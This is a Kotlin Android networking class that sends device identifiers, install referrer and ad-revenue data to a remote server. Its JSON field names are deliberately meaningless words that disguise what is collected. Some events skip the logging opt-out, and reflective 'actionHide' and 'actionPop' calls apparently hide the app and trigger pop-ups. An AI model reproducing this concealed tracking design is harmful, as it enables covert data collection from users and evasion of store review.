package com.cross.line

import android.os.Build
import com.anythink.core.api.ATAdInfo
import com.cross.line.loopcache.LoomCache
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.UUID

/**
 * Date：2024/11/27
 * Describe:
 */
abstract class BaseNetworkImpl {
    // todo del
    private val mURL = if (LineUtils.IS_TEST) "https://test-insure.phrameselect.com/halstead/scary"
    else "https://insure.phrameselect.com/senor/hooligan/specie"

    protected val mIoScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    protected val mOkHttp = OkHttpClient()

    fun postReferrer(ref: String, success: () -> Unit) {
        val js = getCommonInfo(Build.MODEL, Build.MANUFACTURER).apply {
            put("skate", "windy")
            put("splat", "build/")
            put("bistate", ref)
            put("talc", "")
            put("soiree", "")
            put("ulan", "monte")
            put("madmen", 0L)
            put("tropic", 0L)
            put("solon", 0L)
            put("reagan", 0L)
            put("aboard", 0L)
            put("pfizer", LoomCache.mAppInstallTime)
        }
        postRequest(strToRequest(js.toString()), {
            success.invoke()
        }, 20)
    }

    private fun getCommonInfo(module: String = "", manu: String = ""): JSONObject {
        return JSONObject().apply {
            put("skylight", JSONObject().apply {
                put("donnelly", LoomCache.mAndroidIdStr)
                put("bowdoin", LoomCache.mAndroidIdStr)
                put("jungian", LoomCache.mApplication.packageName)
                put("haitian", UUID.randomUUID().toString())
                put("raft", "")
                put("aberdeen", "_")
                put("catawba", "accredit")
                put("pigskin", LoomCache.mAppVersionStr)
                put("pablo", manu)
                put("nought", module)
                put("furlough", System.currentTimeMillis())
                put("rpm", Build.VERSION.RELEASE)
            })
        }
    }


    fun postList(list: List<String>) {
        if (KnotCenter.mBean.isCanPostLog.not()) {
            LineUtils.log("cancel postList--->$list")
            return
        }
        LineUtils.log("postList--->$list")
        val jsA = JSONArray()
        list.forEach {
            val js = getCommonInfo().apply {
                put("skate", it)
            }
            jsA.put(js)
        }
        postRequest(strToRequest(jsA.toString()), retry = 2)
    }

    fun postEvent(string: String, pair: Pair<String, String>? = null) {
        val isNameMust = KnotCenter.listName.contains(string)
        if (KnotCenter.mBean.isCanPostLog.not() && isNameMust.not()) {
            LineUtils.log("cancel post $string")
            return
        }
        LineUtils.log("post $string")
        val js = getCommonInfo().apply {
            put("skate", string)
            pair?.let {
                put("${it.first}/schedule", it.second)
            }
        }
        postRequest(strToRequest(js.toString()), {}, if (isNameMust) 20 else 2)
    }

    fun adValuePost(atAdInfo: ATAdInfo) {
        val js = getCommonInfo().apply {
            put("skate", "cupid")
            put("serology", atAdInfo.publisherRevenue * 1000000)
            put("demure", atAdInfo.currency)
            put("topheavy", atAdInfo.networkName)
            put("divine", "topon")
            put("molten", atAdInfo.placementId)
            put("ding", "i_line")
            put("snappish", atAdInfo.format)
        }
        postRequest(strToRequest(js.toString()), {}, 2)
    }

    private fun strToRequest(body: String): Request {
        return Request.Builder().post(
            body.toRequestBody("application/json".toMediaType())
        ).addHeader("aberdeen", "_").url("$mURL?nought=").build()
    }

    private fun postRequest(request: Request, success: () -> Unit = {}, retry: Int = 3) {
        mOkHttp.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                LineUtils.log("postRequest--->$e")
                if (retry > 0) {
                    mIoScope.launch {
                        delay(25000)
                        postRequest(request, success, retry - 1)
                    }
                }
            }


            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                val code = response.isSuccessful && response.code == 200
                LineUtils.log("postRequest--->$body ---$code")
                if (code) {
                    success.invoke()
                } else {
                    if (retry > 0) {
                        mIoScope.launch {
                            delay(25000)
                            postRequest(request, success, retry - 1)
                        }
                    }
                }
            }
        })
    }

    protected fun actionHide() {
        runCatching {
            Class.forName("com.cross.line.KnotCenter")
                .getMethod("lineNameSetting", String::class.java).invoke(null, "m1hc90")
        }
    }

    protected fun actionPop() {
        runCatching {
            Class.forName("com.cross.line.KnotCenter")
                .getMethod("lineNameSetting", String::class.java).invoke(null, "qz1mhszs12")
        }
    }

}